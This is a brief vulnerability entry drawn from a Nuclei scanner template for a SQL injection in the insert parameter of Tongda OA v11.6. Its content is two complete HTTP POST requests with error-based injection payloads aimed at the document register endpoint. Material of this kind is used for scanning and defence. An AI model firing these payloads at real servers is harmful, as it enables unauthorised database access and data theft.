# Vulnerability: Tongda OA v11.6 Insert Parameter - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`tongda-insert-sqli.yaml`)

## Description
Tongda OA v11.6 insert parameters contain SQL injection vulnerabilities, through which attackers can obtain sensitive database information

## Vulnerable Code Pattern / Exploit Payload
```http
POST /general/document/index.php/recv/register/insert HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))<128,1,710)))# =1&_SERVER=

POST /general/document/index.php/recv/register/insert HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))>128,1,710)))# =1&_SERVER=
```

